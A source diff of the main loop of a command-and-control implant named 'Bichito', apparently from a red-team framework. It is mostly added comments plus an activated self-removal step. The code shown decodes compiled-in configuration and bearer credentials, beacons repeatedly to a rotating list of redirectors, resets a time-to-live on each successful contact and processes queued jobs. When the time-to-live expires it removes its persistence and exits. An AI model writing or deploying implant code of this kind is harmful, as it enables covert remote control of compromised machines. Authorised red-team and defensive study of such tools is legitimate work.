@@ -15,11 +15,15 @@ import (
 	"os"
 	"strings"
 	//Debug
-	"fmt"
+	//"fmt"
 	"sync"
 )
 
-// Structures to decode basic Bichito Parameters
+/*
+JSON Structures for Compiling Redirectors and Implants (Bichito)
+These JSON structure will be passed to the go compiling process to provide most of the configurations related to which modules are active.
+Hive will have the same definitions in: ./src/hive/hiveImplants.go
+*/
 type BiConfig struct {
     Ttl string   `json:"ttl"`
     Resptime   string `json:"resptime"`
@@ -33,6 +37,10 @@ type BiAuth struct {
     Token string  `json:"token"`  
 }
 
+/*
+This JSON Object definition is needed in the redirector to wrap within Jobs the RID of the redirector (same definition)
+Hive will have the same definitions in: ./src/hive/hiveDB.go
+*/
 type Job struct {
     Cid  string   `json:"cid"`              // The client CID triggered the job
     Jid  string   `json:"jid"`              // The Job Id (J-<ID>), useful to avoid replaying attacks
@@ -45,6 +53,7 @@ type Job struct {
     Parameters string   `json:"parameters"` // Parameters will be JSON serialized to provide flexibility
 }
 
+//Bichito "on-memory" Job slices to manage Jobs that are being sent to Hive, or to an Implant
 type JobsToHive struct {
 	mux  sync.RWMutex
 	Jobs []*Job
@@ -56,7 +65,20 @@ type JobsToProcess struct {
 }
 
 
-//Useful structures that will be present on memory till TTL or implant termination
+//On Compile variables:
+/*
+    parameters --> JSON Encoded String with all Bichito,Network/Persistence Module data...
+    biconfig   --> JSON Object where parameters will be decoded to
+    authbearer --> Bichito JSON Object Credentials for the header
+    resptime --> Time to wait in seconds between one Implant cycles (between egression cycles towards redirectors)
+    ttl --> Time to Live, if bichito cannot connect to any director in this amount of time, remove itself
+    bid --> Bichito BID
+
+    jobsToHive --> Jobs to Hive on memory slice
+    jobsToProcess --> Jobs to be processed by the Implant
+
+    ttlC --> ttl Channel, to send a signal that stops the Implant main loop
+*/
 var(
 	parameters string
 
@@ -76,16 +98,30 @@ var(
 	ttlC *time.Timer
 )
 
-
+/*
+Description: Implant Main Function
+Flow:
+A.Decode "On-compiled" input JSON string with Implant configurations
+B.Initialize on-memory slices of jobs
+C.Check if there are any persistence module activated so Implant knows it need to remove itself on inactivity 
+  (so we avoid left Implants on footholds)
+D.Extract network module parameters from previous JSON object, and prepare them (returning a slice of redirectors to connect to)
+E.Prepare authenticaton header to log into redirectors
+F.Prepare channels for signals to be used in the main loop
+G.Main Implant Active Loop:
+	G1.Use first redirector on slice to try to egress
+	G2.If sucessful,reset ttl timer and start a jobProcessor routine
+	G3.If error to connect to the redirector, try with the same redirector 4 times,if still failing,move the redirector to the end of the
+	   slice and try to connect to the next one
+	G4.If after TTL of try to connect to redirectors no positive coms where received, signal to stop the Implant, if persistence as active,
+	   remove from disk any piece of it and kill the process 
+*/
 func main() {
 	var result string
 
 	//Decode Redirector Parameters
 	errDaws := json.Unmarshal([]byte(parameters),&biconfig)
 	if errDaws != nil {
-
-		//Debug: JSON params
-		//fmt.Println("Parameters JSON Decoding error:"+errDaws.Error())
 		os.Exit(1)
 	}
 
@@ -110,7 +146,10 @@ func main() {
 
 
 	sysinfo = false
-	//Prepare Network Module: Decode Json data and redirectors to set them on memory
+	
+	/*Prepare Network Module: Decode Json data and redirectors to set them on memory
+		This function alongside with "connectOut" network functions, will change in relation with the network module selected (golang "tag" selected)
+	*/
 	redirectors = network.PrepareNetworkMocule(biconfig.Coms)
 
 	//Prepare Pre-Checked Authentication for Implant
@@ -125,19 +164,17 @@ func main() {
 	contChannel := make(chan string, 1)
 	
 	var swapCount int
+	
 	//Try to connect to any redirectors and process jobs. 
 	//Repeat each respTime and reset TTL on sucessful connection
 	for {
 		result = "Empty"
 		go func(){
+			//Conect OUT is a routine that will be executed to egress
 			result = connectOut()
 			if result == "Success"{
 				ttlC.Reset(time.Duration(ttl) * time.Second)
 				swapCount = 0
-				
-				//Debug: Jobs in queue, and jobs to Hive in queue
-				//fmt.Println(jobsToProcess.Jobs)
-				//fmt.Println(jobsToHive.Jobs)
 				
 				go jobProcessor()
 				contChannel <- "True"
@@ -163,27 +200,22 @@ func main() {
 		// Select connected, continue trying to connect or Timeout
 		select{
 			case <- contChannel:
-				time.Sleep(time.Duration(resptime) * time.Second)
-
-				//Debug: Continue debug
-				//fmt.Println("next round")
-				fmt.Println(result)				
+				time.Sleep(time.Duration(resptime) * time.Second)			
 				
 			case <- ttlC.C:
 
-				//Debug: Reason to TTL
-				//fmt.Println("ttl")
-				//fmt.Println(result)
-				//TO-DO:RemoveInfection()
-				//os.Exit(1)
+				if persisted == true{
+					RemoveInfection()
+				}
+
+				os.Exit(1)
 		}
 	}
 }
 
-
+//Start removal routine
 func RemoveInfection() (bool,string){
 
 	err,res := persistence.RemovePersistence(biconfig.Persistence)
-
 	return err,res
 }
